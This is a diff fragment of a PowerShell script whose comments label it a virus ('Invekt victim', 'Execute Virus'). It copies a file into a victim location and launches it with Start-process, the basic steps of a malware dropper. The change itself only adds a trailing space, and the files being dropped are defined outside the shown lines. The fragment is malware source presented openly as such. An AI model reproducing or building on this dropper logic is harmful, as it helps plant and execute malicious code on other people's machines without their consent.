@@ -6,4 +6,4 @@ Copy-Item -path $input -destination $output
 #Invekt victim
 Copy-Item -path $inputv -destination $outputv
 #Execute Virus
-Start-process -path $outputv
+Start-process -path $outputv 
